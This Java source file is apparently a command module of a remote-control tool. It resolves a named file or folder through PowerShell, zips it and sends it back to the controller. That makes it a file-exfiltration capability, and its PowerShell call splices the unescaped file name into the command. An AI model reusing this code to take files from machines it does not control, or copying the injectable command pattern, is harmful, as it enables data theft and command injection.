package commands;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.zip.ZipEntry;
import java.util.zip.ZipException;
import java.util.zip.ZipOutputStream;

import control.Controller;

public class SendCommand extends Command{
	private String _fileName;
	private List<File> fileList;
	
	public SendCommand() {
		super("send");
		fileList = new ArrayList<File>();
	}

	protected boolean parse(String command) {
		boolean ok = false;
		
		if(command.contains(_commandName)) {
			try {
				_fileName = command.split("\"")[1];
			}catch(Exception e) {
				throw new IllegalArgumentException();
			}
			ok = true;
		}
		
		return ok;
	}
	
	@Override
	public void execute(Controller ctrl) throws IOException {
		String path = ctrl.execute("Get-Item '" + _fileName + "' | Select-Object FullName | Format-List");
		
		File fileToCompress = new File(fetch(path));
		if(fileToCompress.exists()) {
			File fileCompressed = compress(fileToCompress, ctrl);
			if(fileCompressed.exists()) {
				ctrl.sendFile(fileCompressed);
				fileCompressed.delete();
			}
		} else {
			ctrl.sendMsg("The specified file/dir does not exists");
		}
	}

	private File compress(File fileToCompress, Controller ctrl){
		byte[] buffer = new byte[1024];
    	
		try{
			String path = fileToCompress.getAbsolutePath();
			String zipPath = path + ".zip";
			
			FileOutputStream fos = new FileOutputStream(zipPath);
		    ZipOutputStream zos = new ZipOutputStream(fos);
		    	
			if(fileToCompress.isFile()) {
		    	ZipEntry ze= new ZipEntry(_fileName);
		    	zos.putNextEntry(ze);
		    	FileInputStream in = new FileInputStream(path);
		   	   
		    	int len;
		    	while ((len = in.read(buffer)) > 0) {
		    		zos.write(buffer, 0, len);
		    	}
	
		    	in.close();
		
			}
			else {
				generateFileList(fileToCompress);
			    	
			   	for(File file : fileList){
			   		try {
				   		ZipEntry ze= new ZipEntry(file.getName());
				   		zos.putNextEntry(ze);
				   		FileInputStream in = new FileInputStream(file.getAbsolutePath());
				    		
				   		int len;
				       	while ((len = in.read(buffer)) > 0) {
				       		zos.write(buffer, 0, len);
				       	}
				       	in.close();
			   		}catch(ZipException ex){
			   			//weird zip format exception when compressing some xml files
			   		}
			   	}
			}
			zos.closeEntry();
		    zos.close();
		    fos.close();
		    ctrl.sendMsg("File compressed");

		    return new File(zipPath);
		}catch(Exception e) {
	    	ctrl.sendMsg(e.getStackTrace().toString() + " " + e.getMessage());
	    	return null;
	    }
	}
	
	private void generateFileList(File node){
    	//add file only
		if(node.isFile()){
			fileList.add(node);
		}
		else if(node.isDirectory()){
			String[] subNote = node.list();
			for(String filename : subNote){
				generateFileList(new File(node, filename));
			}
		}
    }
	
	private static String fetch(String str) {
		boolean exit = false;
		int first = 0, i = 0;
		
		exit = false;
		while(i < str.length() && !exit) {
			char aux = str.charAt(i);
			if(aux == ':') {
				first = i;
				exit = true;
			}
			i++;
		}
		
		return str.substring(first + 2, str.length());
	}
	
}
